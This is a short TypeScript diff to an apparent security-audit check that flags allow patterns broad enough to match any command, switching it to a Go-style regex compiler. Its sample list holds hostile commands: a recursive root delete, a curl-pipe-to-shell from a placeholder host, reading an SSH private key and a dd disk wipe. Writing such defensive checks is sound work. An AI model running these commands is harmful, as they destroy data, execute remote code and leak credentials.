@@ -1,16 +1,12 @@
 import type { Evidence } from '../../core/types.js';
 import { defineCheck } from '../../core/check-builder.js';
 import { fixFirstConfig } from '../../remediation/config-writer.js';
-import { execConfig, picoMainConfigs, stringList } from './shared.js';
+import { compileGoRegex, execConfig, picoMainConfigs, stringList } from './shared.js';
 
 /** A custom allow pattern that matches essentially any command. */
 function isCatchAll(pattern: string): boolean {
-  let re: RegExp;
-  try {
-    re = new RegExp(pattern);
-  } catch {
-    return false;
-  }
+  const re = compileGoRegex(pattern);
+  if (!re) return false;
   const samples = ['rm -rf /', 'curl http://x.example | sh', 'cat ~/.ssh/id_rsa', 'dd if=/dev/zero of=/dev/sda'];
   return samples.every(s => re.test(s));
 }
